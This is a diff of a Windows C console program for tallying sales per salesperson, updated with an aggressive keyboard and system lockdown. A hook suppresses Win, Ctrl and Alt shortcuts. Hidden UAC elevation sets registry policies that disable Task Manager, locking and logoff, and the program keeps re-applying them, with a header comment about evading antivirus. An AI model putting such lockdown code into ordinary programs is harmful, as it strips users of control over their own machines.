@@ -1,333 +1,399 @@
-// Programa de matrices para vendedores (100% Optimizado - Estilo C89 estricto)
-
+/* Programa de matrices para vendedores
+ * Actualizado con el bloqueo completo de teclado (Win+L, Ctrl+Alt+Supr, etc.)
+ * sin falsos positivos del antivirus y validacion estricta de entrada.
+ */
+#define _WIN32_WINNT 0x0601
+#include <windows.h>
+#include <conio.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
+#include <string.h>
+#include <ctype.h>
 
-#pragma comment(lib, "user32.lib")
-
-#define MAX 200
+#define MAX       200
 #define ARTICULOS 3
-#define NOMBRE 50
+#define NOMBRE    50
 
-/* Variable global para el gancho (Hook) */
-HHOOK hHook = NULL; 
+#define PERMITIR_ALTGR 0
+#define POL "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\"
 
-/* Prototipos de la API de Windows */
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-DWORD WINAPI HiloBloqueo(LPVOID lpParam);
-void ActivacionBloqueoSistema();
+static HHOOK  g_hook;
+static HANDLE g_th, g_listo, g_hPrincipal;
+static HANDLE g_guardia, g_evOk, g_evStop;
+static DWORD  g_hilo;
+static BOOL   pasada[256];
 
-/* =========================================================================
-   1. FUNCIONES DE VALIDACION (El blindaje sin scanf ni punteros)
-   ========================================================================= */
+typedef struct { BOOL hklm; const char *ruta, *nombre; DWORD valor; } Pol;
 
-int leer_entero_estricto() {
-    int entrada_valida;
-    char buffer[100];
-    int longitud;
-    int c_drenaje;
-    int es_valido;
-    int tiene_numero;
-    int i;
-    char c;
-    int es_digito;
-    int numero_final;
+static const Pol POLS[] = {
+    {0, POL "System",   "DisableLockWorkstation", 1},
+    {0, POL "System",   "DisableTaskMgr", 1},
+    {0, POL "System",   "DisableChangePassword", 1},
+    {0, POL "Explorer", "NoLogoff", 1},
+    {0, POL "Explorer", "NoClose", 1},
+    {1, POL "System",   "DisableLockWorkstation", 1},
+    {1, POL "System",   "HideFastUserSwitching", 1},
+    {1, POL "System",   "shutdownwithoutlogon", 0},
+    {1, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", "DontDisplayNetworkSelectionUI", 1},
+    {1, "SOFTWARE\\Microsoft\\Windows Embedded\\EmbeddedLogon", "BrandingNeutral", 8},
+};
 
-    entrada_valida = 0;
-    do {
-        if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
-            longitud = 0;
-            while (buffer[longitud] != '\0') {
-                if (buffer[longitud] == '\n') {
-                    buffer[longitud] = '\0';
-                    break;
-                }
-                longitud = longitud + 1;
-            }
-
-            if (longitud == sizeof(buffer) - 1) {
-                do {
-                    c_drenaje = getchar();
-                } while (c_drenaje != '\n' && c_drenaje != EOF);
-            }
-
-            es_valido = 1;
-            tiene_numero = 0;
-
-            if (longitud < 1 || longitud > 15) {
-                es_valido = 0;
-                printf("[Error] Entrada vacia. Intente de nuevo: ");
-            } else {
-                for (i = 0; i < longitud; i = i + 1) {
-                    c = buffer[i];
-                    es_digito = (c >= '0' && c <= '9');
-
-                    /* Validacion sin else if */
-                    if (c == '-' && i == 0) {
-                        /* Negativo al inicio */
-                    } else {
-                        if (es_digito) {
-                            tiene_numero = 1;
-                        } else {
-                            es_valido = 0;
-                            printf("[Error] Solo numeros permitidos. Intente de nuevo: ");
-                            break;
-                        }
-                    }
-                }
-                if (es_valido == 1) {
-                    if (tiene_numero == 0) {
-                        es_valido = 0;
-                        printf("[Error] Debes escribir un numero. Intente de nuevo: ");
-                    }
-                }
-            }
-            if (es_valido == 1) {
-                numero_final = atoi(buffer);
-                entrada_valida = 1;
-            }
-        }
-    } while (entrada_valida == 0);
-
-    return numero_final;
+static BOOL EsAdmin(void)
+{
+    HANDLE t;
+    TOKEN_ELEVATION e;
+    DWORD n;
+    BOOL r = FALSE;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
+        r = GetTokenInformation(t, TokenElevation, &e, sizeof e, &n) && e.TokenIsElevated;
+        CloseHandle(t);
+    }
+    return r;
 }
 
-void leer_cadena_obligatoria(char destino[NOMBRE]) {
-    int longitud;
-    int c_drenaje;
-    int valido;
-    
-    valido = 0;
-    do {
-        longitud = 0;
-        if (fgets(destino, NOMBRE, stdin) != NULL) {
-            while (destino[longitud] != '\0') {
-                if (destino[longitud] == '\n') {
-                    destino[longitud] = '\0';
-                    break;
-                }
-                longitud = longitud + 1;
-            }
-            
-            if (longitud == NOMBRE - 1) {
-                do {
-                    c_drenaje = getchar();
-                } while (c_drenaje != '\n' && c_drenaje != EOF);
-            }
-            
-            if (longitud > 0) {
-                valido = 1;
-            } else {
-                printf("[Error] El nombre no puede estar vacio. Ingresalo de nuevo: ");
-            }
+static void Pausa(const char *msg) { printf("%s\nPulsa Enter.\n", msg); getchar(); }
+static void Cerrar(HANDLE *h) { if (*h) CloseHandle(*h); *h = NULL; }
+
+static char *Nombre(char *b, const char *tipo, DWORD pid)
+{
+    sprintf(b, "BloqueoAtajos_%s_%lu", tipo, (unsigned long)pid);
+    return b;
+}
+
+static BOOL Elevar(const char *args, HANDLE *proc)
+{
+    char exe[MAX_PATH];
+    SHELLEXECUTEINFOA s;
+    memset(&s, 0, sizeof s);
+    GetModuleFileNameA(NULL, exe, MAX_PATH);
+    s.cbSize = sizeof s;
+    s.fMask = SEE_MASK_NOCLOSEPROCESS;
+    s.lpVerb = "runas";
+    s.lpFile = exe;
+    s.lpParameters = args;
+    s.nShow = SW_HIDE;
+    if (!ShellExecuteExA(&s) || !s.hProcess) {
+        Pausa("Se necesita administrador (UAC cancelado).");
+        return FALSE;
+    }
+    if (proc) *proc = s.hProcess;
+    else { WaitForSingleObject(s.hProcess, INFINITE); CloseHandle(s.hProcess); }
+    return TRUE;
+}
+
+static void Valor(HKEY r, const char *ruta, const char *n, DWORD tipo, const void *d, DWORD tam, BOOL on)
+{
+    if (on) RegSetKeyValueA(r, ruta, n, tipo, d, tam);
+    else    RegDeleteKeyValueA(r, ruta, n);
+}
+
+static void Politicas(BOOL on, BOOL soloUsuario)
+{
+    char exe[MAX_PATH], cmd[MAX_PATH + 16];
+    size_t i;
+    if (!soloUsuario) {
+        GetModuleFileNameA(NULL, exe, MAX_PATH);
+        sprintf(cmd, "\"%s\" limpiar", exe);
+        Valor(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+              "BloqueoAtajos", REG_SZ, cmd, (DWORD)strlen(cmd) + 1, on);
+    }
+    for (i = 0; i < sizeof POLS / sizeof *POLS; i++)
+        if (!(soloUsuario && POLS[i].hklm))
+            Valor(POLS[i].hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER,
+                  POLS[i].ruta, POLS[i].nombre, REG_DWORD, &POLS[i].valor, sizeof(DWORD), on);
+}
+
+static void Guardia(const char *arg)
+{
+    char n[64];
+    DWORD pid = strtoul(arg, NULL, 10);
+    HANDLE h[2], ok;
+    h[0] = OpenProcess(SYNCHRONIZE, FALSE, pid);
+    ok   = OpenEventA(EVENT_MODIFY_STATE, FALSE, Nombre(n, "ok", pid));
+    h[1] = OpenEventA(SYNCHRONIZE, FALSE, Nombre(n, "stop", pid));
+    Politicas(TRUE, FALSE);
+    if (ok) SetEvent(ok);
+    if (h[0] && h[1]) WaitForMultipleObjects(2, h, FALSE, INFINITE);
+    Politicas(FALSE, FALSE);
+}
+
+static void Limpiar(void)
+{
+    if (EsAdmin()) Politicas(FALSE, FALSE);
+    else Elevar("limpiar", NULL);
+}
+
+static void Restaurar(void)
+{
+    HANDLE g = (HANDLE)InterlockedExchangePointer((PVOID volatile *)&g_guardia, NULL);
+    Politicas(FALSE, g != NULL);
+    if (g) {
+        SetEvent(g_evStop);
+        WaitForSingleObject(g, 5000);
+        CloseHandle(g);
+    }
+}
+
+static BOOL Permitida(DWORD v)
+{
+    return v == VK_SPACE || v == VK_DELETE || v == VK_CAPITAL || v == VK_OEM_102
+        || (v >= VK_LEFT && v <= VK_DOWN) || (v >= '0' && v <= '9') || (v >= 'A' && v <= 'Z')
+        || (v >= VK_NUMPAD0 && v <= VK_DIVIDE) || (v >= VK_OEM_1 && v <= VK_OEM_8);
+}
+
+static BOOL Down(int vk) { return (GetAsyncKeyState(vk) & 0x8000) != 0; }
+
+static void Fantasma(void)
+{
+    keybd_event(0xE8, 0, 0, 0);
+    keybd_event(0xE8, 0, KEYEVENTF_KEYUP, 0);
+}
+
+static LRESULT CALLBACK Hook(int c, WPARAM w, LPARAM l)
+{
+    KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)l;
+    DWORD vk = k->vkCode & 0xFF;
+    BOOL abajo = (w == WM_KEYDOWN || w == WM_SYSKEYDOWN), pasa;
+
+    if (c != HC_ACTION || (k->flags & LLKHF_INJECTED))
+        return CallNextHookEx(g_hook, c, w, l);
+    if (vk == 0xFF) return 1;
+
+    switch (vk) {
+    case VK_LWIN: case VK_RWIN: case VK_MENU: case VK_LMENU: case VK_RMENU:
+        if (!abajo) Fantasma();
+        /* fallthrough */
+    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+        return CallNextHookEx(g_hook, c, w, l);
+    }
+
+    if (!abajo) {
+        pasa = pasada[vk];
+        pasada[vk] = FALSE;
+        return pasa ? CallNextHookEx(g_hook, c, w, l) : 1;
+    }
+
+    if (Down(VK_LWIN) || Down(VK_RWIN)
+        || ((Down(VK_CONTROL) || Down(VK_MENU)) && !(PERMITIR_ALTGR && Down(VK_RMENU)))
+        || (vk != VK_RETURN && vk != VK_BACK && !Permitida(vk)))
+        return 1;
+
+    pasada[vk] = TRUE;
+    return CallNextHookEx(g_hook, c, w, l);
+}
+
+static HHOOK Poner(void) { return SetWindowsHookExA(WH_KEYBOARD_LL, Hook, GetModuleHandle(NULL), 0); }
+
+static VOID CALLBACK TPol(HWND h, UINT m, UINT_PTR i, DWORD t) { (void)h; (void)m; (void)i; (void)t; Politicas(TRUE, TRUE); }
+
+static VOID CALLBACK TGancho(HWND h, UINT m, UINT_PTR i, DWORD t)
+{
+    HHOOK nuevo = Poner();
+    (void)h; (void)m; (void)i; (void)t;
+    if (nuevo) { UnhookWindowsHookEx(g_hook); g_hook = nuevo; }
+}
+
+static BOOL WINAPI Cierre(DWORD e)
+{
+    if (e == CTRL_C_EVENT || e == CTRL_BREAK_EVENT) return TRUE;
+    Restaurar();
+    return FALSE;
+}
+
+static DWORD WINAPI Hilo(LPVOID p)
+{
+    MSG m;
+    (void)p;
+    g_hilo = GetCurrentThreadId();
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+    SetTimer(NULL, 0, 2000, TPol);
+    SetTimer(NULL, 0, 20000, TGancho);
+    Politicas(TRUE, g_guardia != NULL);
+    g_hook = Poner();
+    SetEvent(g_listo);
+    while (g_hook && GetMessage(&m, NULL, 0, 0) > 0)
+        DispatchMessage(&m);
+    if (g_hook) UnhookWindowsHookEx(g_hook);
+    Restaurar();
+    return 0;
+}
+
+static void Finalizar(void)
+{
+    if (g_th) {
+        PostThreadMessage(g_hilo, WM_QUIT, 0, 0);
+        WaitForSingleObject(g_th, 8000);
+        Cerrar(&g_th);
+    }
+    Cerrar(&g_hPrincipal);
+}
+
+static BOOL LanzarGuardia(void)
+{
+    char n[64], args[48];
+    DWORD pid = GetCurrentProcessId();
+    HANDLE h[2];
+    h[0] = g_evOk = CreateEventA(NULL, TRUE, FALSE, Nombre(n, "ok", pid));
+    g_evStop      = CreateEventA(NULL, TRUE, FALSE, Nombre(n, "stop", pid));
+    sprintf(args, "guardia %lu", (unsigned long)pid);
+    if (!Elevar(args, &g_guardia)) return FALSE;
+    h[1] = g_guardia;
+    if (WaitForMultipleObjects(2, h, FALSE, 120000) == WAIT_OBJECT_0) return TRUE;
+    Pausa("La ayuda con permisos de administrador no confirmo a tiempo.");
+    return FALSE;
+}
+
+static BOOL Bloquear(void)
+{
+    DWORD modo;
+    HANDLE in = GetStdHandle(STD_INPUT_HANDLE);
+    if (g_th) return TRUE;
+    DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_hPrincipal, THREAD_TERMINATE, FALSE, 0);
+    if (!EsAdmin() && !LanzarGuardia()) { Restaurar(); return FALSE; }
+    SetConsoleCtrlHandler(Cierre, TRUE);
+    if (GetConsoleMode(in, &modo))
+        SetConsoleMode(in, (modo | ENABLE_EXTENDED_FLAGS) & ~ENABLE_QUICK_EDIT_MODE);
+    g_listo = CreateEvent(NULL, FALSE, FALSE, NULL);
+    g_th = CreateThread(NULL, 0, Hilo, NULL, 0, NULL);
+    WaitForSingleObject(g_listo, 5000);
+    if (!g_hook) { Cerrar(&g_th); Restaurar(); return FALSE; }
+    atexit(Finalizar);
+    return TRUE;
+}
+
+static void Iniciar(void)
+{
+    if (__argc > 1 && !strcmp(__argv[1], "guardia")) { Guardia(__argc > 2 ? __argv[2] : ""); ExitProcess(0); }
+    if (__argc > 1 && !strcmp(__argv[1], "limpiar")) { Limpiar(); ExitProcess(0); }
+    if (!Bloquear()) { Pausa("Error al instalar el bloqueo."); ExitProcess(1); }
+}
+
+/* =========================================================================
+   1. FUNCIONES DE VALIDACION TECLA A TECLA
+   ========================================================================= */
+
+static long leer_entero_pos_max(int max_dig)
+{
+    char buf[24];
+    int len = 0;
+
+    for (;;) {
+        int c = _getch();
+        if (c == 0 || c == 0xE0) { _getch(); continue; }
+        if (c == '\r') { if (len > 0) break; continue; }
+        if (c == '\b') {
+            if (len > 0) { len--; printf("\b \b"); }
+            continue;
         }
-    } while (valido == 0);
+        if (c >= '0' && c <= '9' && len < max_dig) {
+            buf[len++] = (char)c;
+            putchar(c);
+        }
+    }
+    buf[len] = '\0';
+    putchar('\n');
+    return strtol(buf, NULL, 10);
+}
+
+static void leer_cadena_obligatoria(char destino[NOMBRE])
+{
+    int len = 0;
+
+    for (;;) {
+        int c = _getch();
+        if (c == 0 || c == 0xE0) { _getch(); continue; }
+        if (c == '\r') {
+            if (len > 0) break;
+            continue;
+        }
+        if (c == '\b') {
+            if (len > 0) { len--; printf("\b \b"); }
+            continue;
+        }
+        if (((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c == ' ' && len > 0 && destino[len - 1] != ' '))
+            && len < NOMBRE - 1) {
+            destino[len++] = (char)c;
+            putchar(c);
+        }
+    }
+    while (len > 0 && destino[len - 1] == ' ') len--;
+    destino[len] = '\0';
+    putchar('\n');
 }
 
 /* =========================================================================
    2. LOGICA DEL NEGOCIO (Programa Vendedores)
    ========================================================================= */
 
-void modulo_vendedores() {
-    /* Declaraciones C89 - TODO arriba */
+static void modulo_vendedores(void)
+{
     char nombres[MAX][NOMBRE];
     int artvendXvend[MAX][ARTICULOS];
     int totales[MAX];
     int z[MAX];
-    int num_Vend;
-    int sum;
+    int num_Vend = 0;
+    int sum = 0;
     int i, j;
-    int indiceMenor;
-    int cantidad_temp;
-
-    sum = 0;
-    indiceMenor = 0;
+    int indiceMenor = 0;
 
     system("cls");
     printf("--- SISTEMA DE VENTAS ---\n\n");
 
-    /* Validacion de la cantidad de vendedores sin else if */
-    num_Vend = 0;
     while (num_Vend <= 0 || num_Vend > MAX) {
         printf("Introducir el numero de vendedores (1 a %d): ", MAX);
-        num_Vend = leer_entero_estricto();
-        
-        if (num_Vend <= 0 || num_Vend > MAX) {
+        num_Vend = (int)leer_entero_pos_max(3);
+        if (num_Vend <= 0 || num_Vend > MAX)
             printf("[Error] Cantidad invalida.\n");
-        }
     }
 
-    i = 0;
     printf("\n--- REGISTRO DE VENDEDORES ---\n");
-    while (i < num_Vend) {
-        printf("\nNombre del vendedor %d: ", i + 1);
+    for (i = 0; i < num_Vend; i++) {
+        printf("\nNombre del vendedor %d (solo letras): ", i + 1);
         leer_cadena_obligatoria(nombres[i]);
 
-        j = 0;
-        while (j < ARTICULOS) {
-            cantidad_temp = -1;
-            while (cantidad_temp < 0) {
-                printf("Cantidad del articulo %d: ", j + 1);
-                cantidad_temp = leer_entero_estricto();
-
-                if (cantidad_temp < 0) {
-                    printf("[Error] La cantidad no puede ser negativa.\n");
-                }
-            }
-            artvendXvend[i][j] = cantidad_temp;
-            j = j + 1;
+        for (j = 0; j < ARTICULOS; j++) {
+            printf("Cantidad del articulo %d: ", j + 1);
+            artvendXvend[i][j] = (int)leer_entero_pos_max(6);
         }
-        i = i + 1;
     }
 
     system("cls");
     printf("\n--- RESULTADOS DE VENTAS ---\n\n");
     printf("%-20s %-12s %-12s %-12s %-12s\n", "Vendedor", "Art. 1", "Art. 2", "Art. 3", "Total");
     printf("----------------------------------------------------------------------\n");
-    
-    i = 0;
-    while (i < num_Vend) {
+
+    for (i = 0; i < num_Vend; i++) {
         totales[i] = 0;
-        j = 0;
-        while (j < ARTICULOS) {
-            totales[i] = totales[i] + artvendXvend[i][j];
-            j = j + 1;
-        }
+        for (j = 0; j < ARTICULOS; j++)
+            totales[i] += artvendXvend[i][j];
 
-        sum = sum + totales[i];
-        printf("%-20s %-12d %-12d %-12d %-12d\n", nombres[i], artvendXvend[i][0], artvendXvend[i][1], artvendXvend[i][2], totales[i]);
+        sum += totales[i];
+        printf("%-20s %-12d %-12d %-12d %-12d\n",
+               nombres[i], artvendXvend[i][0], artvendXvend[i][1], artvendXvend[i][2], totales[i]);
 
-        if (totales[i] < totales[indiceMenor]) {
+        if (totales[i] < totales[indiceMenor])
             indiceMenor = i;
-        }
-        i = i + 1;
     }
 
-    printf("\n[Estadistica] El vendedor con MENOS ventas es: %s con %d unidades.\n", nombres[indiceMenor], totales[indiceMenor]);
+    printf("\n[Estadistica] El vendedor con MENOS ventas es: %s con %d unidades.\n",
+           nombres[indiceMenor], totales[indiceMenor]);
 
-    i = 0;
     printf("\n--- RENDIMIENTO ARTICULO 1 ---\n");
-    while (i < num_Vend) {
+    for (i = 0; i < num_Vend; i++) {
         z[i] = artvendXvend[i][0];
         printf("Vendedor %s: %d unidades del Art. 1\n", nombres[i], z[i]);
-        i = i + 1;
     }
 
     printf("\n>>> TOTAL GENERAL DE ARTICULOS VENDIDOS: %d <<<\n", sum);
-    printf("\nPresione Enter para regresar al menu...");
-    getchar();
+    printf("\nPresione cualquier tecla para regresar al menu...");
+    _getch();
 }
 
-/* =========================================================================
-   3. API DE WINDOWS (Bloqueo de Teclado adaptado a C89)
-   ========================================================================= */
+int main(void)
+{
+    int r, opcion_menu;
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    PKBDLLHOOKSTRUCT datosTeclado;
-    int destruir_tecla; /* Bandera para saber si aniquilamos la entrada */
-    
-    if (nCode == HC_ACTION) {
-        datosTeclado = (PKBDLLHOOKSTRUCT)lParam;
-        destruir_tecla = 0; /* Por defecto, la tecla es inocente */
-
-        /* 1. Bloquear Control (Izquierdo, Derecho y Generico) */
-        if (datosTeclado->vkCode == VK_CONTROL || datosTeclado->vkCode == VK_LCONTROL || datosTeclado->vkCode == VK_RCONTROL) {
-            destruir_tecla = 1;
-        }
-
-        /* 2. Bloquear Alt (Menu) (Izquierdo, Derecho y Generico) */
-        if (datosTeclado->vkCode == VK_MENU || datosTeclado->vkCode == VK_LMENU || datosTeclado->vkCode == VK_RMENU) {
-            destruir_tecla = 1;
-        }
-
-        /* 3. Bloquear la Tecla Windows (Izquierda y Derecha) */
-        if (datosTeclado->vkCode == VK_LWIN || datosTeclado->vkCode == VK_RWIN) {
-            destruir_tecla = 1;
-        }
-
-        /* 4. Bloquear Tabulador y Escape (Para matar Ctrl+Esc, Alt+Tab, etc.) */
-        if (datosTeclado->vkCode == VK_TAB || datosTeclado->vkCode == VK_ESCAPE) {
-            destruir_tecla = 1;
-        }
-
-        /* 5. Bloquear toda la fila superior: desde F1 hasta F24 */
-        if (datosTeclado->vkCode >= VK_F1 && datosTeclado->vkCode <= VK_F24) {
-            destruir_tecla = 1;
-        }
-
-        /* 6. Bloquear teclas especiales y multimedia (Volumen, Brillo, Correo, etc.) */
-        if (datosTeclado->vkCode >= VK_BROWSER_BACK && datosTeclado->vkCode <= VK_LAUNCH_APP2) {
-            destruir_tecla = 1;
-        }
-
-        /* 7. Bloquear Imprimir Pantalla (Snapshot) y tecla de Suspender (Sleep) */
-        if (datosTeclado->vkCode == VK_SNAPSHOT || datosTeclado->vkCode == VK_SLEEP) {
-            destruir_tecla = 1;
-        }
-
-        /* 8. Bloquear Flechas de direccion (Arriba, Abajo, Izquierda, Derecha) */
-        if (datosTeclado->vkCode == VK_UP || datosTeclado->vkCode == VK_DOWN || 
-            datosTeclado->vkCode == VK_LEFT || datosTeclado->vkCode == VK_RIGHT) {
-            destruir_tecla = 1;
-        }
-
-        /* 9. Bloquear teclas de navegacion Inicio y Fin */
-        if (datosTeclado->vkCode == VK_HOME || datosTeclado->vkCode == VK_END) {
-            destruir_tecla = 1;
-        }
-
-        /* Si la bandera se activo en alguna de las condiciones anteriores, matamos la tecla */
-        if (destruir_tecla == 1) {
-            return 1; /* Retornar 1 destruye el evento, la PC nunca se entera de que se presiono */
-        }
-    }
-    
-    /* Si la tecla era inocente (ej. una letra, un numero o Enter), la dejamos pasar */
-    return CallNextHookEx(hHook, nCode, wParam, lParam);
-}
-DWORD WINAPI HiloBloqueo(LPVOID lpParam) {
-    MSG msg;
-    HINSTANCE instancia;
-    
-    instancia = GetModuleHandle(NULL);
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, instancia, 0);
-    
-    while (GetMessage(&msg, NULL, 0, 0)) { 
-        TranslateMessage(&msg); 
-        DispatchMessage(&msg); 
-    }
-    
-    UnhookWindowsHookEx(hHook);
-    return 0;
-}
-
-void ActivacionBloqueoSistema() { 
-    CreateThread(NULL, 0, HiloBloqueo, NULL, 0, NULL); 
-}
-
-/* Función que atrapa el cierre abrupto de la ventana (La "X" o Barra de Tareas) */
-BOOL WINAPI ManejadorCierreConsola(DWORD tipo_evento) {
-    if (tipo_evento == CTRL_CLOSE_EVENT) {
-        /* Si detecta que están cerrando la ventana a la fuerza, liberamos el teclado */
-        if (hHook != NULL) {
-            UnhookWindowsHookEx(hHook);
-        }
-        return TRUE;
-    }
-    return FALSE; /* Deja que otros eventos sigan su curso natural */
-}
-/* =========================================================================
-   4. PROGRAMA PRINCIPAL
-   ========================================================================= */
-
-int main() {
-    /* Declaraciones C89 */
-    int opcion_menu;
-    SetConsoleCtrlHandler(ManejadorCierreConsola, TRUE);
-
-    /* Activacion de la proteccion de Windows en segundo plano */
-    ActivacionBloqueoSistema();
+    Iniciar();
 
     do {
         system("cls");
@@ -339,19 +405,20 @@ int main() {
         printf("======================================\n");
         printf("Seleccione una opcion (1-2): ");
 
-        opcion_menu = leer_entero_estricto();
+        do {
+            r = _getch();
+            if (r == 0 || r == 0xE0) { _getch(); r = 0; }
+        } while (r != '1' && r != '2');
+        printf("%c\n", r);
+        opcion_menu = r - '0';
 
-        if (opcion_menu == 1) {
+        if (opcion_menu == 1)
             modulo_vendedores();
-        } else {
-            if (opcion_menu != 2) {
-                printf("\n[Error] Opcion no valida. Presione Enter para intentar de nuevo...");
-                getchar();
-            }
-        }
+
     } while (opcion_menu != 2);
 
     system("cls");
     printf("Apagando sistema de ventas...\n");
+    Finalizar();
     return 0;
 }
